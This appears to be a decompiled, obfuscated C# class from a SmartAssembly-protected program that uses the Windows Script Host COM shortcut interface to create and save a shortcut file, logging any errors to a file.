using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public sealed class HlWlITsmUUg
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface kpinoXcZhil
	{
		[DispId(0)]
		string uFkqMAQgtc
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string BElvcEXkDqlbjXA
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string BSmyANTvFhKhsR
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string nLljiESiiKu
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string xrXBIlyEEbtA
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string itDnnMwKsWt
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string YgPVknkYMXOVOcK
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int qDzjKGlAkqb
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string TAutKoUzvy
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type jTVdmInbLVXjsrr;

	private static object BskQAyxusXgW;

	[NonSerialized]
	internal static GetString getString_0;

	public static void QQkpLVQKiGTK(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			kpinoXcZhil kpinoXcZhil = (kpinoXcZhil)jTVdmInbLVXjsrr.InvokeMember(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107401984)), BindingFlags.InvokeMethod, null, BskQAyxusXgW, new object[1] { string_0 });
			kpinoXcZhil.BSmyANTvFhKhsR = string_4;
			kpinoXcZhil.nLljiESiiKu = string_5;
			kpinoXcZhil.YgPVknkYMXOVOcK = string_1;
			kpinoXcZhil.TAutKoUzvy = string_3;
			kpinoXcZhil.BElvcEXkDqlbjXA = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				kpinoXcZhil.xrXBIlyEEbtA = string_6;
			}
			kpinoXcZhil.Save();
		}
		catch (Exception ex)
		{
			if (arFNxqUpEFyGtTT.geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(arFNxqUpEFyGtTT.UvHPjcAlchtwE, getString_0(107402435) + ex.Message + getString_0(107396394));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static HlWlITsmUUg()
	{
		Strings.CreateGetStringDelegate(typeof(HlWlITsmUUg));
		jTVdmInbLVXjsrr = Type.GetTypeFromProgID(arFNxqUpEFyGtTT.tjPFETNBnBMzUXk(getString_0(107402422)));
		BskQAyxusXgW = Activator.CreateInstance(jTVdmInbLVXjsrr);
	}
}
